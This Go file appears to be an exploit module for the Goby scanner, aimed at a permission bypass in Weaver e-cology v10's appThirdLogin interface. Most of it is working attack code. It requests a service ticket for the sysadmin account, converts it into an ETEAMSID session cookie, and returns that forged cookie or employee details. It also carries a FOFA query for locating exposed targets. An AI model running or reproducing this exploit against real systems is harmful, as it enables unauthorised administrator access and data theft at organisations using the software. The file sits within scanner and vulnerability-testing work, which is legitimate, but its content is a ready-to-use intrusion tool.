package exploits

import (
	"fmt"
	"regexp"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Weaver e-cology v10 appThirdLogin Permission Bypass Vulnerability",
    "Description": "<p>Weaver E10, a new generation of digital operation construction platform, is a new development based on the original eteams platform, while integrating all the functions of the original E9 product, and finally developed a new platform. </p><p>The appThirdLogin interface and subsequent interfaces have Cookie forgery vulnerabilities. Unauthorized attackers can forge cookies, make use of cookies, obtain account passwords, and log in to the background, causing damage.</p>",
    "Product": "Weaver-OA(E-COLOGY)",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2024-08-20",
    "PostTime": "2024-08-21",
    "Author": "hhh3156",
    "FofaQuery": "body=\"/build/passport/static/js/lib.js\" && body=\"/build/ecodesdk/static/js/lib.js\"",
    "GobyQuery": "body=\"/build/passport/static/js/lib.js\" && body=\"/build/ecodesdk/static/js/lib.js\"",
    "Level": "2",
    "Impact": "<p>The appThirdLogin interface and subsequent interfaces have Cookie forgery vulnerabilities. Unauthorized attackers can forge cookies, make use of cookies, obtain account passwords, and log in to the background, causing damage.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2. Deploy a web application firewall. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "getCurrentSimpleEmployee,Cookie",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass",
        "HW-2024"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "泛微 e-cology v10 appThirdLogin 权限绕过漏洞",
            "Product": "泛微-OA（e-cology）",
            "Description": "<p>泛微新一代数字化运营构建平台E10，是基于原eteams平台之上全新研发，同时融合了原E9产品的所有功能，最终研发出全新平台。<br></p><p>其appThirdLogin接口及后续接口，存在Cookie伪造漏洞，未经授权的攻击者可以伪造Cookie，进行Cookie的相关利用，获取账户密码，登录后台，从而造成危害。<br></p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>其appThirdLogin接口及后续接口，存在Cookie伪造漏洞，未经授权的攻击者可以伪造Cookie，进行Cookie的相关利用，获取账户密码，登录后台，从而造成危害。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Weaver e-cology v10 appThirdLogin Permission Bypass Vulnerability",
            "Product": "Weaver-OA(E-COLOGY)",
            "Description": "<p>Weaver E10, a new generation of digital operation construction platform, is a new development based on the original eteams platform, while integrating all the functions of the original E9 product, and finally developed a new platform.&nbsp;</p><p>The appThirdLogin interface and subsequent interfaces have Cookie forgery vulnerabilities. Unauthorized attackers can forge cookies, make use of cookies, obtain account passwords, and log in to the background, causing damage.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2. Deploy a web application firewall.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The appThirdLogin interface and subsequent interfaces have Cookie forgery vulnerabilities. Unauthorized attackers can forge cookies, make use of cookies, obtain account passwords, and log in to the background, causing damage.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9941"
}`

	sendPayload_UGUIGFhua9595gMNVuga32LA := func(hostInfo *httpclient.FixUrl) (bool, string, string, string, string) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			PostRequest.Data = data
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		path1 := "/papi/passport/rest/appThirdLogin"
		data1 := `username=sysadmin&service=1&ip=1&loginType=third`
		header := map[string]string{
			"User-Agent":   "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Content-Type": "application/x-www-form-urlencoded",
		}

		resp, err := setPostRequest(hostInfo, path1, data1, header)
		if err != nil || resp.StatusCode != 200 {
			return false, "", "", "", ""
		}

		regular1 := `"serviceTicketId":"([\s\S]*?)",`

		makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
			reRequest := regexp.MustCompile(RegularUrl)
			if !reRequest.MatchString(RegularContent) {
				return "", fmt.Errorf("can't match value")
			}
			getname := reRequest.FindStringSubmatch(RegularContent)
			return getname[1], nil
		}

		serviceTicketId, err := makeRegular(resp.RawBody, regular1)
		if err != nil || serviceTicketId == "" {
			return false, "", "", "", ""
		}

		path2 := "/papi/passport/login/generateEteamsId"
		data2 := "stTicket=" + serviceTicketId

		resp2, err := setPostRequest(hostInfo, path2, data2, header)
		if err != nil || resp2.StatusCode != 200 {
			return false, "", "", "", ""
		}
		regular2 := `"data":"([\s\S]*?)"`

		ETEAMSID, err := makeRegular(resp2.RawBody, regular2)
		if err != nil || ETEAMSID == "" {
			return false, "", "", "", ""
		}

		setGetRequest := func(hostInfo *httpclient.FixUrl, urlGet string, cookie string, head map[string]string) (*httpclient.HttpResponse, error) {
			GetRequest := httpclient.NewGetRequestConfig(urlGet)
			GetRequest.Timeout = 15
			GetRequest.VerifyTls = false
			GetRequest.FollowRedirect = false
			GetRequest.Header.Store("Cookie", "ETEAMSID="+cookie)
			for headName, headValue := range head {
				GetRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, GetRequest)
		}

		path3 := `/api/hrm/card/getCurrentSimpleEmployee`
		resp3, err := setGetRequest(hostInfo, path3, ETEAMSID, header)
		if err != nil || resp2.StatusCode != 200 {
			return false, "", "", "", ""
		}
		regular_name := `,"username":"([\S\s]*?)",`
		regular_id := `,"userId":"([\S\s]*?)"}`
		regular_department_name := `"department":[\S\s]*?,"name":"([\S\s]*?)","datarank":`

		name, err := makeRegular(resp3.RawBody, regular_name)
		if err != nil || name == "" {
			return false, "", "", "", ""
		}

		id, err := makeRegular(resp3.RawBody, regular_id)
		if err != nil || id == "" {
			return false, "", "", "", ""
		}

		department_name, err := makeRegular(resp3.RawBody, regular_department_name)
		if err != nil || department_name == "" {
			return false, "", "", "", ""
		}

		return true, ETEAMSID, name, id, department_name
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, _, _, _, _ := sendPayload_UGUIGFhua9595gMNVuga32LA(hostInfo)

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.FixedHostInfo + `/papi/passport/rest/appThirdLogin`
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			resbool, Cookie, name, id, department_name := sendPayload_UGUIGFhua9595gMNVuga32LA(expResult.HostInfo)
			if resbool == false {
				expResult.Success = false
				expResult.Output = "Exploitation failed"
				return expResult
			}

			attacktype := goutils.B2S(ss.Params["attackType"])

			if attacktype == "Cookie" {
				expResult.Output = "Cookie: ETEAMSID=" + Cookie + "\n请在Cookie中自行复制替换"
				expResult.Success = true

			} else if attacktype == "getCurrentSimpleEmployee" {
				expResult.Success = true
				expResult.Output = "当前Cookie的用户角色的相关信息为：\nName: " + name + "\nID: " + id + "\nDepartment_Name: " + department_name

			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
